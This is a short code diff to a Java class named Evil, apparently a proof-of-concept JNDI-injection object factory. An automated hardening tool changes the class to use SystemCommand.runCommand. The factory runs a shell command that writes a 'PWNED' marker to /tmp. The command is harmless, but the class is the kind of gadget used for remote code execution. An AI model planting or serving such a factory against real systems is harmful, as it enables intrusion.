@@ -1,3 +1,4 @@
+import io.github.pixee.security.SystemCommand;
 import javax.naming.Context;
 import javax.naming.Name;
 import javax.naming.spi.ObjectFactory;
@@ -11,7 +12,7 @@ public  class Evil implements  ObjectFactory  {
             "-c",
             "echo PWNED > /tmp/pwned"
         };
-        Runtime.getRuntime().exec(cmd);
+        SystemCommand.runCommand(Runtime.getRuntime(), cmd);
         return  null;
     }
 }
